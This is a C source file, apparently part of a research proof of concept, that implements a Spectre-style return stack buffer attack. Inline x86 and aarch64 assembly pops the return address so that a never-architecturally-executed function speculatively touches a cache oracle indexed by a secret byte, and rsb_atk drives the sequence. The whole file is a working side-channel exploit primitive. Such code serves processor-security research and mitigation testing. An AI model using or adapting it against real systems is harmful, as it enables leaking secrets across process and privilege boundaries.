#include "rsb.h"

// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
  register uintptr_t sp asm ("sp"); // additionally, flush stack pointer to enlarge execution window
#if defined(__i386__) || defined(__x86_64__)
  asm volatile("pop %%rax\n" : : : "rax");
  _mm_clflush(sp);
#elif defined(__aarch64__)
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
#endif
  return 0;
}

int __attribute__ ((noinline)) call_leak(char s) {
  // Manipulate the stack so that we don't return here, but to call_start
  call_manipulate_stack();
  // architecturally, this is never executed
  // Encode data in covert channel
  maccess(oracle_block + s * PAGESIZE);
  return 2;
}

int __attribute__ ((noinline)) call_start(char s) {
  call_leak(s);
  //_mm_mfence(); // improves execution cycle count in gem5, but decreases accuracy natively
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  char s = 'A';

  call_start(s);
  call_leak(s);
  call_manipulate_stack();

}


void rsb_atk(char info){
    flush(oracle_block, PAGESIZE);
    _mm_mfence();
    call_start(info);
    _mm_mfence();
}

